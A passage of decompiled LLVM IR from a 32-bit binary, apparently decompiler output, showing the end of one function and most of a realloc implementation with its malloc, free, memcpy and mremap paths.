  %tmp19 = icmp eq i32 %tmp18, 16
  %v1_8065b65 = inttoptr i32 %v1_8065b2e to i32*
  store i32 0, i32* %v1_8065b65, align 4
  %v0_8065b6b = load i32, i32* %ebx.global-to-local, align 4
  %v1_8065b6b = add i32 %v0_8065b6b, 4
  %v2_8065b6b = inttoptr i32 %v1_8065b6b to i32*
  store i32 0, i32* %v2_8065b6b, align 4
  %v0_8065b72 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8065b72 = add i32 %v0_8065b72, 8
  %v2_8065b72 = inttoptr i32 %v1_8065b72 to i32*
  store i32 0, i32* %v2_8065b72, align 4
  %v2_8065b79 = or i1 %v5_8065b62, %tmp19
  br i1 %v2_8065b79, label %dec_label_pc_8065baf, label %dec_label_pc_8065b7b

dec_label_pc_8065b7b:                             ; preds = %dec_label_pc_8065b62
  %v0_8065b7b = load i32, i32* %eax.global-to-local, align 4
  %v0_8065b7e = load i32, i32* %ebx.global-to-local, align 4
  %v1_8065b7e = add i32 %v0_8065b7e, 12
  %v2_8065b7e = inttoptr i32 %v1_8065b7e to i32*
  store i32 0, i32* %v2_8065b7e, align 4
  %v0_8065b85 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8065b85 = add i32 %v0_8065b85, 16
  %v2_8065b85 = inttoptr i32 %v1_8065b85 to i32*
  store i32 0, i32* %v2_8065b85, align 4
  %tmp20 = icmp ult i32 %v0_8065b7b, 7
  br i1 %tmp20, label %dec_label_pc_8065baf, label %dec_label_pc_8065b8e

dec_label_pc_8065b8e:                             ; preds = %dec_label_pc_8065b7b
  %v0_8065b8e = load i32, i32* %eax.global-to-local, align 4
  %v9_8065b8e = icmp eq i32 %v0_8065b8e, 9
  %v0_8065b91 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8065b91 = add i32 %v0_8065b91, 20
  %v2_8065b91 = inttoptr i32 %v1_8065b91 to i32*
  store i32 0, i32* %v2_8065b91, align 4
  %v0_8065b98 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8065b98 = add i32 %v0_8065b98, 24
  %v2_8065b98 = inttoptr i32 %v1_8065b98 to i32*
  store i32 0, i32* %v2_8065b98, align 4
  %v1_8065b9f = icmp eq i1 %v9_8065b8e, false
  br i1 %v1_8065b9f, label %dec_label_pc_8065baf, label %dec_label_pc_8065ba1

dec_label_pc_8065ba1:                             ; preds = %dec_label_pc_8065b8e
  %v0_8065ba1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8065ba1 = add i32 %v0_8065ba1, 28
  %v2_8065ba1 = inttoptr i32 %v1_8065ba1 to i32*
  store i32 0, i32* %v2_8065ba1, align 4
  %v0_8065ba8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8065ba8 = add i32 %v0_8065ba8, 32
  %v2_8065ba8 = inttoptr i32 %v1_8065ba8 to i32*
  store i32 0, i32* %v2_8065ba8, align 4
  br label %dec_label_pc_8065baf

dec_label_pc_8065baf:                             ; preds = %dec_label_pc_8065b8e, %dec_label_pc_8065b7b, %dec_label_pc_8065b62, %dec_label_pc_8065b3c, %dec_label_pc_8065b0a, %dec_label_pc_8065b53, %dec_label_pc_8065ba1
  store i32 %v12_8065ad7, i32* %eax.global-to-local, align 4
  %v3_8065bb8 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  store i32 %v3_8065bb8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8065bc0

dec_label_pc_8065bc0:                             ; preds = %dec_label_pc_8065af7, %dec_label_pc_8065baf
  %v0_8065bc3 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8065bc3, i32* %eax.global-to-local, align 4
  store i32 %v0_8065ad6, i32* @ebx, align 4
  store i32 %v0_8065ad4, i32* @edi, align 4
  ret i32 %v0_8065bc3

; uselistorder directives
  uselistorder i32 %v1_8065b46, { 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 4, 5, 3, 6, 7, 8, 9, 10, 11, 13, 12 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8065bc0, { 1, 0 }
  uselistorder label %dec_label_pc_8065baf, { 6, 0, 1, 2, 5, 3, 4 }
}

define i32 @realloc() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8065bcc = load i32, i32* @ebp, align 4
  %v0_8065bcd = load i32, i32* @edi, align 4
  %v0_8065bce = load i32, i32* @esi, align 4
  %v0_8065bcf = load i32, i32* @ebx, align 4
  %v4_8065bd3 = icmp eq i32 %tmp7, 0
  store i32 %tmp6, i32* @ebx, align 4
  %v1_8065bdc = icmp eq i1 %v4_8065bd3, false
  br i1 %v1_8065bdc, label %dec_label_pc_8065bee, label %dec_label_pc_8065bde

dec_label_pc_8065bde:                             ; preds = %entry
  %v1_8065be2 = call i32 @malloc(i32 %tmp6)
  store i32 %v1_8065be2, i32* %eax.global-to-local, align 4
  store i32 %v1_8065be2, i32* @ebx, align 4
  br label %dec_label_pc_8065ef7

dec_label_pc_8065bee:                             ; preds = %entry
  %v1_8065bee = icmp eq i32 %tmp6, 0
  %v1_8065bf0 = icmp eq i1 %v1_8065bee, false
  br i1 %v1_8065bf0, label %dec_label_pc_8065c03, label %dec_label_pc_8065bf2

dec_label_pc_8065bf2:                             ; preds = %dec_label_pc_8065bee
  %v1_8065bf9 = call i32 @free(i32 %tmp7)
  store i32 %v1_8065bf9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8065ef7

dec_label_pc_8065c03:                             ; preds = %dec_label_pc_8065bee
  %v2_8065c0e = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8065c0e, i32* %eax.global-to-local, align 4
  %v4_8065c13 = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134623208, i32 ptrtoint (i32* @global_var_80719f8.1606 to i32))
  store i32 %v4_8065c13, i32* %eax.global-to-local, align 4
  %v1_8065c1f = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80719f8.1606 to i32))
  store i32 %v1_8065c1f, i32* %eax.global-to-local, align 4
  %v0_8065c27 = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_8065c27, -32
  br i1 %tmp, label %dec_label_pc_8065c3f, label %dec_label_pc_8065c2c

dec_label_pc_8065c2c:                             ; preds = %dec_label_pc_8065c03
  store i32 -8, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  store i32 12, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8065efa

dec_label_pc_8065c3f:                             ; preds = %dec_label_pc_8065c03
  %v1_8065c3f = add i32 %v0_8065c27, 11
  store i32 %v1_8065c3f, i32* %eax.global-to-local, align 4
  %v1_8065c48 = and i32 %v1_8065c3f, -8
  %tmp19 = icmp ult i32 %v1_8065c3f, 16
  %v7_8065c55 = select i1 %tmp19, i32 16, i32 %v1_8065c48
  store i32 %v7_8065c55, i32* %edx.global-to-local, align 4
  %v1_8065c59 = add i32 %tmp7, -8
  store i32 %v1_8065c59, i32* @edi, align 4
  store i32 %v7_8065c55, i32* %stack_var_-44, align 4
  %v1_8065c5f = add i32 %tmp7, -4
  %v2_8065c5f = inttoptr i32 %v1_8065c5f to i32*
  %v3_8065c5f = load i32, i32* %v2_8065c5f, align 4
  store i32 %v3_8065c5f, i32* %edx.global-to-local, align 4
  %v1_8065c64 = and i32 %v3_8065c5f, -4
  store i32 %v1_8065c64, i32* %eax.global-to-local, align 4
  %v2_8065c67 = and i32 %v3_8065c5f, 2
  %v3_8065c67 = icmp eq i32 %v2_8065c67, 0
  %v1_8065c6e = icmp eq i1 %v3_8065c67, false
  br i1 %v1_8065c6e, label %dec_label_pc_8065e09, label %dec_label_pc_8065c74

dec_label_pc_8065c74:                             ; preds = %dec_label_pc_8065c3f
  store i32 %v7_8065c55, i32* @ecx, align 4
  store i32 %v1_8065c64, i32* %ebx.global-to-local, align 4
  %v7_8065c79 = icmp ult i32 %v1_8065c64, %v7_8065c55
  %v1_8065c7b = icmp eq i1 %v7_8065c79, false
  br i1 %v1_8065c7b, label %dec_label_pc_8065db4, label %dec_label_pc_8065c81

dec_label_pc_8065c81:                             ; preds = %dec_label_pc_8065c74
  %v2_8065c81 = add i32 %v1_8065c64, %v1_8065c59
  store i32 %v2_8065c81, i32* @esi, align 4
  %v1_8065c84 = load i32, i32* @global_var_80788fc.1609, align 4
  %v12_8065c84 = icmp eq i32 %v2_8065c81, %v1_8065c84
  %v1_8065c8a = icmp eq i1 %v12_8065c84, false
  %v1_8065cc4 = add i32 %v2_8065c81, 4
  %v2_8065cc4 = inttoptr i32 %v1_8065cc4 to i32*
  %v3_8065cc4 = load i32, i32* %v2_8065cc4, align 4
  br i1 %v1_8065c8a, label %dec_label_pc_8065cc4, label %dec_label_pc_8065c8c

dec_label_pc_8065c8c:                             ; preds = %dec_label_pc_8065c81
  %v1_8065c8f = and i32 %v3_8065cc4, -4
  %v2_8065c92 = add i32 %v1_8065c8f, %v1_8065c64
  store i32 %v2_8065c92, i32* @ecx, align 4
  %v1_8065c98 = add i32 %v7_8065c55, 16
  store i32 %v1_8065c98, i32* %eax.global-to-local, align 4
  %v7_8065c9b = icmp ult i32 %v2_8065c92, %v1_8065c98
  br i1 %v7_8065c9b, label %dec_label_pc_8065d02, label %dec_label_pc_8065c9f

dec_label_pc_8065c9f:                             ; preds = %dec_label_pc_8065c8c
  %v1_8065ca2 = urem i32 %v3_8065c5f, 2
  store i32 %tmp7, i32* @ebx, align 4
  %v4_8065ca9 = or i32 %v1_8065ca2, %v7_8065c55
  store i32 %v4_8065ca9, i32* %edx.global-to-local, align 4
  %v2_8065cac = sub i32 %v2_8065c92, %v7_8065c55
  %v2_8065cae = add i32 %v7_8065c55, %v1_8065c59
  store i32 %v2_8065cae, i32* %eax.global-to-local, align 4
  %v1_8065cb1 = or i32 %v2_8065cac, 1
  store i32 %v1_8065cb1, i32* @ecx, align 4
  store i32 %v4_8065ca9, i32* %v2_8065c5f, align 4
  %v0_8065cb7 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8065cb7, i32* @global_var_80788fc.1609, align 4
  %v0_8065cbc = load i32, i32* @ecx, align 4
  %v2_8065cbc = add i32 %v0_8065cb7, 4
  %v3_8065cbc = inttoptr i32 %v2_8065cbc to i32*
  store i32 %v0_8065cbc, i32* %v3_8065cbc, align 4
  br label %dec_label_pc_8065ee9

dec_label_pc_8065cc4:                             ; preds = %dec_label_pc_8065c81
  store i32 %v3_8065cc4, i32* %edx.global-to-local, align 4
  %v1_8065cc9 = and i32 %v3_8065cc4, -2
  store i32 %v1_8065cc9, i32* %eax.global-to-local, align 4
  %v3_8065ccc = add i32 %v1_8065cc4, %v1_8065cc9
  %v4_8065ccc = inttoptr i32 %v3_8065ccc to i8*
  %v5_8065ccc = load i8, i8* %v4_8065ccc, align 1
  %v6_8065ccc = urem i8 %v5_8065ccc, 2
  %v7_8065ccc = icmp eq i8 %v6_8065ccc, 0
  %v1_8065cd1 = icmp eq i1 %v7_8065ccc, false
  br i1 %v1_8065cd1, label %dec_label_pc_8065d02, label %dec_label_pc_8065cd3

dec_label_pc_8065cd3:                             ; preds = %dec_label_pc_8065cc4
  store i32 %v1_8065c64, i32* %eax.global-to-local, align 4
  %v1_8065cd7 = and i32 %v3_8065cc4, -4
  store i32 %v1_8065cd7, i32* %edx.global-to-local, align 4
  %v2_8065cda = add i32 %v1_8065cd7, %v1_8065c64
  store i32 %v2_8065cda, i32* %ebx.global-to-local, align 4
  %v9_8065cdd = icmp ult i32 %v2_8065cda, %v7_8065c55
  br i1 %v9_8065cdd, label %dec_label_pc_8065d02, label %dec_label_pc_8065ce2

dec_label_pc_8065ce2:                             ; preds = %dec_label_pc_8065cd3
  %v1_8065ce2 = add i32 %v1_8065c64, %tmp7
  %v2_8065ce2 = inttoptr i32 %v1_8065ce2 to i32*
  %v3_8065ce2 = load i32, i32* %v2_8065ce2, align 4
  store i32 %v3_8065ce2, i32* %edx.global-to-local, align 4
  %v1_8065ce5 = add i32 %v2_8065c81, 12
  %v2_8065ce5 = inttoptr i32 %v1_8065ce5 to i32*
  %v3_8065ce5 = load i32, i32* %v2_8065ce5, align 4
  store i32 %v3_8065ce5, i32* %eax.global-to-local, align 4
  %v1_8065ce8 = add i32 %v3_8065ce2, 12
  %v2_8065ce8 = inttoptr i32 %v1_8065ce8 to i32*
  %v3_8065ce8 = load i32, i32* %v2_8065ce8, align 4
  %v15_8065ce8 = icmp eq i32 %v3_8065ce8, %v2_8065c81
  %v1_8065ceb = icmp eq i1 %v15_8065ce8, false
  br i1 %v1_8065ceb, label %dec_label_pc_8065cf2, label %dec_label_pc_8065ced

dec_label_pc_8065ced:                             ; preds = %dec_label_pc_8065ce2
  %v1_8065ced = add i32 %v3_8065ce5, 8
  %v2_8065ced = inttoptr i32 %v1_8065ced to i32*
  %v3_8065ced = load i32, i32* %v2_8065ced, align 4
  %v15_8065ced = icmp eq i32 %v3_8065ced, %v2_8065c81
  br i1 %v15_8065ced, label %dec_label_pc_8065cf7, label %dec_label_pc_8065cf2

dec_label_pc_8065cf2:                             ; preds = %dec_label_pc_8065ced, %dec_label_pc_8065ce2
  %v0_8065cf2 = call i32 @abort()
  store i32 %v0_8065cf2, i32* %eax.global-to-local, align 4
  %v1_8065cf7.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8065cf7

dec_label_pc_8065cf7:                             ; preds = %dec_label_pc_8065ced, %dec_label_pc_8065cf2
  %v1_8065cf7 = phi i32 [ %v3_8065ce2, %dec_label_pc_8065ced ], [ %v1_8065cf7.pre, %dec_label_pc_8065cf2 ]
  %v0_8065cf7 = phi i32 [ %v3_8065ce5, %dec_label_pc_8065ced ], [ %v0_8065cf2, %dec_label_pc_8065cf2 ]
  %v2_8065cf7 = add i32 %v1_8065cf7, 12
  %v3_8065cf7 = inttoptr i32 %v2_8065cf7 to i32*
  store i32 %v0_8065cf7, i32* %v3_8065cf7, align 4
  %v0_8065cfa = load i32, i32* %edx.global-to-local, align 4
  %v1_8065cfa = load i32, i32* %eax.global-to-local, align 4
  %v2_8065cfa = add i32 %v1_8065cfa, 8
  %v3_8065cfa = inttoptr i32 %v2_8065cfa to i32*
  store i32 %v0_8065cfa, i32* %v3_8065cfa, align 4
  %v0_8065db4.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8065db4

dec_label_pc_8065d02:                             ; preds = %dec_label_pc_8065cd3, %dec_label_pc_8065cc4, %dec_label_pc_8065c8c
  store i32 0, i32* @ebx, align 4
  %v1_8065d0b = add i32 %v7_8065c55, -7
  store i32 %v1_8065d0b, i32* %eax.global-to-local, align 4
  %v1_8065d0f = call i32 @malloc(i32 %v1_8065d0b)
  store i32 %v1_8065d0f, i32* %eax.global-to-local, align 4
  %v1_8065d17 = icmp eq i32 %v1_8065d0f, 0
  store i32 %v1_8065d0f, i32* %edx.global-to-local, align 4
  br i1 %v1_8065d17, label %dec_label_pc_8065ee9, label %dec_label_pc_8065d21

dec_label_pc_8065d21:                             ; preds = %dec_label_pc_8065d02
  %v1_8065d21 = add i32 %v1_8065d0f, -8
  store i32 %v1_8065d21, i32* %ebx.global-to-local, align 4
  %v1_8065d24 = load i32, i32* @esi, align 4
  %v12_8065d24 = icmp eq i32 %v1_8065d21, %v1_8065d24
  %v1_8065d26 = add i32 %v1_8065d0f, -4
  %v2_8065d26 = inttoptr i32 %v1_8065d26 to i32*
  %v3_8065d26 = load i32, i32* %v2_8065d26, align 4
  store i32 %v3_8065d26, i32* %eax.global-to-local, align 4
  %v1_8065d29 = icmp eq i1 %v12_8065d24, false
  br i1 %v1_8065d29, label %dec_label_pc_8065d37, label %dec_label_pc_8065d2b

dec_label_pc_8065d2b:                             ; preds = %dec_label_pc_8065d21
  store i32 %v1_8065c64, i32* %edx.global-to-local, align 4
  %v1_8065d2f = and i32 %v3_8065d26, -4
  store i32 %v1_8065d2f, i32* %eax.global-to-local, align 4
  %v2_8065d32 = add i32 %v1_8065d2f, %v1_8065c64
  store i32 %v2_8065d32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8065db4

dec_label_pc_8065d37:                             ; preds = %dec_label_pc_8065d21
  %v1_8065d3b = add i32 %v1_8065c64, -4
  store i32 %v1_8065d3b, i32* %eax.global-to-local, align 4
  %v2_8065d40 = udiv i32 %v1_8065d3b, 4
  store i32 %v2_8065d40, i32* @ecx, align 4
  %tmp21 = icmp ult i32 %v1_8065d3b, 37
  br i1 %tmp21, label %dec_label_pc_8065d59, label %dec_label_pc_8065d48

dec_label_pc_8065d48:                             ; preds = %dec_label_pc_8065d37
  %v3_8065d4f = inttoptr i32 %v1_8065d0f to i8*
  %v4_8065d4f = call i32 @memcpy(i8* %v3_8065d4f, i32 %tmp7, i32 %v1_8065d3b)
  store i32 %v4_8065d4f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8065da0

dec_label_pc_8065d59:                             ; preds = %dec_label_pc_8065d37
  store i32 %tmp7, i32* @esi, align 4
  %v1_8065d60 = inttoptr i32 %tmp7 to i32*
  %v2_8065d60 = load i32, i32* %v1_8065d60, align 4
  store i32 %v2_8065d60, i32* %eax.global-to-local, align 4
  %v2_8065d62 = inttoptr i32 %v1_8065d0f to i32*
  store i32 %v2_8065d60, i32* %v2_8065d62, align 4
  %v0_8065d64 = load i32, i32* @esi, align 4
  %v1_8065d64 = add i32 %v0_8065d64, 4
  %v2_8065d64 = inttoptr i32 %v1_8065d64 to i32*
  %v3_8065d64 = load i32, i32* %v2_8065d64, align 4
  store i32 %v3_8065d64, i32* %eax.global-to-local, align 4
  %v1_8065d67 = load i32, i32* %edx.global-to-local, align 4
  %v2_8065d67 = add i32 %v1_8065d67, 4
  %v3_8065d67 = inttoptr i32 %v2_8065d67 to i32*
  store i32 %v3_8065d64, i32* %v3_8065d67, align 4
  %v0_8065d6a = load i32, i32* @esi, align 4
  %v1_8065d6a = add i32 %v0_8065d6a, 8
  %v2_8065d6a = inttoptr i32 %v1_8065d6a to i32*
  %v3_8065d6a = load i32, i32* %v2_8065d6a, align 4
  store i32 %v3_8065d6a, i32* %eax.global-to-local, align 4
  %v1_8065d6d = load i32, i32* %edx.global-to-local, align 4
  %v2_8065d6d = add i32 %v1_8065d6d, 8
  %v3_8065d6d = inttoptr i32 %v2_8065d6d to i32*
  store i32 %v3_8065d6a, i32* %v3_8065d6d, align 4
  %tmp22 = icmp ult i32 %v1_8065d3b, 17
  br i1 %tmp22, label %dec_label_pc_8065da0, label %dec_label_pc_8065d72

dec_label_pc_8065d72:                             ; preds = %dec_label_pc_8065d59
  %v0_8065d72 = load i32, i32* @esi, align 4
  %v1_8065d72 = add i32 %v0_8065d72, 12
  %v2_8065d72 = inttoptr i32 %v1_8065d72 to i32*
  %v3_8065d72 = load i32, i32* %v2_8065d72, align 4
  store i32 %v3_8065d72, i32* %eax.global-to-local, align 4
  %v0_8065d75 = load i32, i32* @ecx, align 4
  %v1_8065d78 = load i32, i32* %edx.global-to-local, align 4
  %v2_8065d78 = add i32 %v1_8065d78, 12
  %v3_8065d78 = inttoptr i32 %v2_8065d78 to i32*
  store i32 %v3_8065d72, i32* %v3_8065d78, align 4
  %v0_8065d7b = load i32, i32* @esi, align 4
  %v1_8065d7b = add i32 %v0_8065d7b, 16
  %v2_8065d7b = inttoptr i32 %v1_8065d7b to i32*
  %v3_8065d7b = load i32, i32* %v2_8065d7b, align 4
  store i32 %v3_8065d7b, i32* %eax.global-to-local, align 4
  %v1_8065d7e = load i32, i32* %edx.global-to-local, align 4
  %v2_8065d7e = add i32 %v1_8065d7e, 16
  %v3_8065d7e = inttoptr i32 %v2_8065d7e to i32*
  store i32 %v3_8065d7b, i32* %v3_8065d7e, align 4
  %tmp23 = icmp ult i32 %v0_8065d75, 7
  br i1 %tmp23, label %dec_label_pc_8065da0, label %dec_label_pc_8065d83

dec_label_pc_8065d83:                             ; preds = %dec_label_pc_8065d72
  %v0_8065d83 = load i32, i32* @esi, align 4
  %v1_8065d83 = add i32 %v0_8065d83, 20
  %v2_8065d83 = inttoptr i32 %v1_8065d83 to i32*
  %v3_8065d83 = load i32, i32* %v2_8065d83, align 4
  store i32 %v3_8065d83, i32* %eax.global-to-local, align 4
  %v0_8065d86 = load i32, i32* @ecx, align 4
  %v9_8065d86 = icmp eq i32 %v0_8065d86, 9
  %v1_8065d89 = load i32, i32* %edx.global-to-local, align 4
  %v2_8065d89 = add i32 %v1_8065d89, 20
  %v3_8065d89 = inttoptr i32 %v2_8065d89 to i32*
  store i32 %v3_8065d83, i32* %v3_8065d89, align 4
  %v0_8065d8c = load i32, i32* @esi, align 4
  %v1_8065d8c = add i32 %v0_8065d8c, 24
  %v2_8065d8c = inttoptr i32 %v1_8065d8c to i32*
  %v3_8065d8c = load i32, i32* %v2_8065d8c, align 4
  store i32 %v3_8065d8c, i32* %eax.global-to-local, align 4
  %v1_8065d8f = load i32, i32* %edx.global-to-local, align 4
  %v2_8065d8f = add i32 %v1_8065d8f, 24
  %v3_8065d8f = inttoptr i32 %v2_8065d8f to i32*
  store i32 %v3_8065d8c, i32* %v3_8065d8f, align 4
  %v1_8065d92 = icmp eq i1 %v9_8065d86, false
  br i1 %v1_8065d92, label %dec_label_pc_8065da0, label %dec_label_pc_8065d94

dec_label_pc_8065d94:                             ; preds = %dec_label_pc_8065d83
  %v0_8065d94 = load i32, i32* @esi, align 4
  %v1_8065d94 = add i32 %v0_8065d94, 28
  %v2_8065d94 = inttoptr i32 %v1_8065d94 to i32*
  %v3_8065d94 = load i32, i32* %v2_8065d94, align 4
  store i32 %v3_8065d94, i32* %eax.global-to-local, align 4
  %v1_8065d97 = load i32, i32* %edx.global-to-local, align 4
  %v2_8065d97 = add i32 %v1_8065d97, 28
  %v3_8065d97 = inttoptr i32 %v2_8065d97 to i32*
  store i32 %v3_8065d94, i32* %v3_8065d97, align 4
  %v0_8065d9a = load i32, i32* @esi, align 4
  %v1_8065d9a = add i32 %v0_8065d9a, 32
  %v2_8065d9a = inttoptr i32 %v1_8065d9a to i32*
  %v3_8065d9a = load i32, i32* %v2_8065d9a, align 4
  store i32 %v3_8065d9a, i32* %eax.global-to-local, align 4
  %v1_8065d9d = load i32, i32* %edx.global-to-local, align 4
  %v2_8065d9d = add i32 %v1_8065d9d, 32
  %v3_8065d9d = inttoptr i32 %v2_8065d9d to i32*
  store i32 %v3_8065d9a, i32* %v3_8065d9d, align 4
  br label %dec_label_pc_8065da0

dec_label_pc_8065da0:                             ; preds = %dec_label_pc_8065d83, %dec_label_pc_8065d72, %dec_label_pc_8065d59, %dec_label_pc_8065d48, %dec_label_pc_8065d94
  %v0_8065da3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8065da3 = add i32 %v0_8065da3, 8
  store i32 %v1_8065da3, i32* @ebx, align 4
  %v1_8065daa = call i32 @free(i32 %tmp7)
  br label %dec_label_pc_8065ee6

dec_label_pc_8065db4:                             ; preds = %dec_label_pc_8065c74, %dec_label_pc_8065d2b, %dec_label_pc_8065cf7
  %v1_8065dc4 = phi i32 [ %v1_8065c64, %dec_label_pc_8065c74 ], [ %v2_8065d32, %dec_label_pc_8065d2b ], [ %v0_8065db4.pre, %dec_label_pc_8065cf7 ]
  %v3_8065db6 = load i32, i32* %stack_var_-44, align 4
  %v4_8065db6 = sub i32 %v1_8065dc4, %v3_8065db6
  store i32 %v4_8065db6, i32* @ecx, align 4
  %tmp24 = icmp ult i32 %v4_8065db6, 16
  br i1 %tmp24, label %dec_label_pc_8065dbe, label %dec_label_pc_8065dd0

dec_label_pc_8065dbe:                             ; preds = %dec_label_pc_8065db4
  %v0_8065dbe = load i32, i32* @edi, align 4
  %v1_8065dbe = add i32 %v0_8065dbe, 4
  %v2_8065dbe = inttoptr i32 %v1_8065dbe to i32*
  %v3_8065dbe = load i32, i32* %v2_8065dbe, align 4
  %v1_8065dc1 = urem i32 %v3_8065dbe, 2
  %v2_8065dc4 = or i32 %v1_8065dc1, %v1_8065dc4
  store i32 %v2_8065dc4, i32* %eax.global-to-local, align 4
  store i32 %v2_8065dc4, i32* %v2_8065dbe, align 4
  %v0_8065dc9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8065dc9 = load i32, i32* @edi, align 4
  %v2_8065dc9 = add i32 %v0_8065dc9, 4
  %v3_8065dc9 = add i32 %v2_8065dc9, %v1_8065dc9
  %v4_8065dc9 = inttoptr i32 %v3_8065dc9 to i32*
  %v5_8065dc9 = load i32, i32* %v4_8065dc9, align 4
  %v6_8065dc9 = or i32 %v5_8065dc9, 1
  store i32 %v6_8065dc9, i32* %v4_8065dc9, align 4
  br label %dec_label_pc_8065e01

dec_label_pc_8065dd0:                             ; preds = %dec_label_pc_8065db4
  store i32 %v3_8065db6, i32* %edx.global-to-local, align 4
  %v0_8065dd3 = load i32, i32* @edi, align 4
  %v2_8065dd3 = add i32 %v0_8065dd3, %v3_8065db6
  store i32 %v2_8065dd3, i32* %eax.global-to-local, align 4
  %v1_8065dd6 = add i32 %v0_8065dd3, 4
  %v2_8065dd6 = inttoptr i32 %v1_8065dd6 to i32*
  %v3_8065dd6 = load i32, i32* %v2_8065dd6, align 4
  %v1_8065dd9 = urem i32 %v3_8065dd6, 2
  %v4_8065ddc = or i32 %v1_8065dd9, %v3_8065db6
  store i32 %v4_8065ddc, i32* %stack_var_-44, align 4
  %v1_8065de1 = or i32 %v4_8065db6, 1
  store i32 %v1_8065de1, i32* %edx.global-to-local, align 4
  store i32 %v4_8065ddc, i32* @ebx, align 4
  store i32 %v4_8065ddc, i32* %v2_8065dd6, align 4
  %v0_8065ded = load i32, i32* %edx.global-to-local, align 4
  %v1_8065ded = load i32, i32* %eax.global-to-local, align 4
  %v2_8065ded = add i32 %v1_8065ded, 4
  %v3_8065ded = inttoptr i32 %v2_8065ded to i32*
  store i32 %v0_8065ded, i32* %v3_8065ded, align 4
  %v0_8065df0 = load i32, i32* @ecx, align 4
  %v1_8065df0 = load i32, i32* %eax.global-to-local, align 4
  %v2_8065df0 = add i32 %v0_8065df0, 4
  %v3_8065df0 = add i32 %v2_8065df0, %v1_8065df0
  %v4_8065df0 = inttoptr i32 %v3_8065df0 to i32*
  %v5_8065df0 = load i32, i32* %v4_8065df0, align 4
  %v6_8065df0 = or i32 %v5_8065df0, 1
  store i32 %v6_8065df0, i32* %v4_8065df0, align 4
  %v0_8065df5 = load i32, i32* %eax.global-to-local, align 4
  %v1_8065df5 = add i32 %v0_8065df5, 8
  store i32 %v1_8065df5, i32* %eax.global-to-local, align 4
  %v1_8065df9 = call i32 @free(i32 %v1_8065df5)
  store i32 %v1_8065df9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8065e01

dec_label_pc_8065e01:                             ; preds = %dec_label_pc_8065dbe, %dec_label_pc_8065dd0
  %v0_8065e01 = load i32, i32* @edi, align 4
  %v1_8065e01 = add i32 %v0_8065e01, 8
  store i32 %v1_8065e01, i32* @ebx, align 4
  br label %dec_label_pc_8065ee9

dec_label_pc_8065e09:                             ; preds = %dec_label_pc_8065c3f
  store i32 %tmp7, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_8065e11 = inttoptr i32 %v1_8065c59 to i32*
  %v3_8065e11 = load i32, i32* %v2_8065e11, align 4
  store i32 %v3_8065e11, i32* @esi, align 4
  %v0_8065e14 = load i32, i32* @global_var_8078c2c.1615, align 4
  %v5_8065e19 = sub i32 0, %v0_8065e14
  store i32 %v5_8065e19, i32* %eax.global-to-local, align 4
  %v2_8065e1a = or i32 %v7_8065c55, 3
  %v3_8065e1a = add i32 %v2_8065e1a, %v3_8065e11
  %v4_8065e20 = add i32 %v3_8065e1a, %v0_8065e14
  %v2_8065e23 = and i32 %v4_8065e20, %v5_8065e19
  store i32 %v2_8065e23, i32* %edx.global-to-local, align 4
  %v2_8065e27 = sub i32 %v2_8065e23, %v3_8065e11
  store i32 %v2_8065e27, i32* @ebp, align 4
  %v15_8065e29 = icmp eq i32 %v1_8065c64, %v2_8065e27
  br i1 %v15_8065e29, label %dec_label_pc_8065ee9, label %dec_label_pc_8065e37

dec_label_pc_8065e37:                             ; preds = %dec_label_pc_8065e09
  %v2_8065e39 = sub i32 %v1_8065c59, %v3_8065e11
  store i32 %v2_8065e39, i32* @edi, align 4
  %v2_8065e40 = add i32 %v3_8065e11, %v1_8065c64
  store i32 %v2_8065e40, i32* %eax.global-to-local, align 4
  %v7_8065e44 = call i32 @mremap(i32 %v2_8065e39, i32 %v2_8065e40, i32 %v2_8065e23, i32 1, i32 %v7_8065c55, i32 %v1_8065c64, i32 %v2_8065e23)
  store i32 %v7_8065e44, i32* %eax.global-to-local, align 4
  %v10_8065e4c = icmp eq i32 %v7_8065e44, -1
  br i1 %v10_8065e4c, label %dec_label_pc_8065ea0, label %dec_label_pc_8065e51

dec_label_pc_8065e51:                             ; preds = %dec_label_pc_8065e37
  %v1_8065e55 = load i32, i32* @esi, align 4
  %v2_8065e55 = add i32 %v1_8065e55, %v7_8065e44
  store i32 %v2_8065e55, i32* %eax.global-to-local, align 4
  %v0_8065e57 = load i32, i32* @ebp, align 4
  %v1_8065e57 = or i32 %v0_8065e57, 2
  %v5_8065e5a = sub i32 %v2_8065e23, %v1_8065c64
